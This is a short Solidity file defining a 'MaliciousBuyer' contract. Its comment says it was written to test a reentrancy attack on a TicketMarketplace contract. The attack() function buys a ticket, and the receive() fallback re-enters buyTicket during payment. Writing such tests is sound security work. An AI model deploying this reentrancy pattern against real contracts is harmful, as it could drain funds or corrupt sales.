// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

/**
Contract created to test reentrancy attack on TicketMarketplace contract
 */

contract MaliciousBuyer {
    address public marketplace;
    address public owner;

    constructor(address _marketplace) {
        marketplace = _marketplace;
        owner = msg.sender;
    }

    function attack(uint256 ticketId) external payable {
        (bool success, ) = marketplace.call{value: msg.value}(
            abi.encodeWithSignature("buyTicket(uint256)", ticketId)
        );
        require(success, "Attack failed");
    }

    receive() external payable {
        (bool success, ) = marketplace.call(
            abi.encodeWithSignature("buyTicket(uint256)", 0)
        );
        require(success, "Reentrancy failed");
    }
}